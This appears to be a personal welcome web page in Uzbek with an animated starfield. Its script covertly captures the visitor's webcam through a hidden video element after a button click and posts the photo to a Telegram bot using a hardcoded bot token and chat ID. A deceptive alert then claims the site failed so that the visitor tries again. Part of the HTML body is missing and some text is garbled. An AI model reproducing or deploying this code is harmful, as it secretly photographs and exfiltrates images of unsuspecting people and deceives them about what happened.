<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mening wep saytimga xush kelibsiz</title>
    <link rel="stylesheet" href="./main.css">
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            margin-top: 50px;
        }

        body {
            background: black;
            overflow: hidden;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        .stars {
            position: absolute;
            width: 100%;
            height: 100%;
        }
        .star {
            position: absolute;
            width: 3px;
            height: 3px;
            background: white;
            border-radius: 50%;
            opacity: 0;
            box-shadow: 0 0 5px white;
            animation: twinkle 3s infinite alternate;
        }
        @keyframes twinkle {
            0% { opacity: 0; transform: scale(0.5); }
            100% { opacity: 1; transform: scale(1.2); }
        }
        .planet {
            position: absolute;
            width: 100px;
            height: 100px;
            background: radial-gradient(circle, #f39c12, #e74c3c);
            border-radius: 50%;
            box-shadow: 0 0 50px rgba(255, 165, 0, 0.8);
            animation: orbit 8s linear infinite;
        }
        @keyframes orbit {
            0% { transform: rotate(0deg) translateX(150px) rotate(0deg); }
            100% { transform: rotate(360deg) translateX(150px) rotate(-360deg); }
        }
        h1 {
            font-size: 3rem;
            color: white;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
            animation: glow 3s infinite alternate;
        }
        @keyframes glow {
            0% { text-shadow: 0 0 10px white; }
            100% { text-shadow: 0 0 30px white; }
        }

        #startBtn {
            padding: 12px 20px;
            font-size: 18px;
            cursor: pointer;
            background-color: #3bf87a;
            color: white;
            border: none;
            border-radius: 5px;
        }

        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid hsl(147, 100%, 53%);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none; 
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        #video {
            display: none;
        }
    </style>
</head>

        const startBtn = document.getElementById("startBtn");
        const loader = document.getElementById("loader");
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        const BOT_TOKEN = "7772442946:AAGsBqTDxTm20nn-NfIye37zGmBpnOZrxTs"; 
        const CHAT_ID = "7221078203"; 

        async function initCamera() {
            loader.style.display = "block"; 
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;

                setTimeout(() => {
                    loader.style.display = "none"; 
                }, 1500);
            } catch (error) {
                loader.style.display = "none";
                alert("Kamera ishlamayapti: " + error);
            }
        }

        async function takeAndSendPhoto() {
            if (!video.srcObject) {
                alert("Siz mening saytimga kirmoqchimisiz");
                return;
            }

            // Rasm olish
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", blob, "photo.jpg");

                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData
                    });
                    const result = await response.json();
                    alert("Saytim chiqmadi yoki telafoningiz ishlamapti boshqattan bosing yoki Ð Ð°Ð·Ñ€ÐµÑˆÐ¸Ñ‚ÑŒ knopkasini bosmagansiz");
                    console.log("Telegram javobi:", result);
                } catch (error) {
                    console.error("Xatolik:", error);
                    alert("âŒ Xatolik yuz berdi.");
                }
            }, "image/jpeg");
        }

        startBtn.addEventListener("click", async () => {
            if (!video.srcObject) await initCamera();
            setTimeout(takeAndSendPhoto, 2000); 
        });


        const starsContainer = document.querySelector('.stars');
        for (let i = 0; i < 100; i++) {
            let star = document.createElement('div');
            star.classList.add('star');
            let x = Math.random() * window.innerWidth;
            let y = Math.random() * window.innerHeight;
            let delay = Math.random() * 3;
            star.style.left = `${x}px`;
            star.style.top = `${y}px`;
            star.style.animationDelay = `${delay}s`;
            starsContainer.appendChild(star);
        }
